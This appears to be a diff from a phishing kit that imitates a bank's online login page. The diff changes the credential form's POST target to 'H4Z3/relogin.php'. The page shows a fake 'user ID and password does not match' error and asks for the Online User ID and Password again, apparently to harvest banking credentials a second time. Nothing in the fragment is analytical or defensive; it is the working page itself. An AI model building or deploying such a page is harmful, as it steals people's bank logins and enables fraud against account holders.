@@ -139,7 +139,7 @@
                                         </header>
                                         <div id="error"></div>
                                         <section class="account-section">
-                                            <form method="POST" action="H4Z3/relogin" id="form" class="pay-transfer-options clearfix">
+                                            <form method="POST" action="H4Z3/relogin.php" id="form" class="pay-transfer-options clearfix">
                                                 <div class="account-title clearfix">
                                                 <div id="fielderror" class="error-message show-error error-visible" role="alert">We're sorry. That user ID and password does not match our records. Please try again, or do you need Login Assistance?</div>
                                                     <p>Please enter your Online User ID and Password.</p>
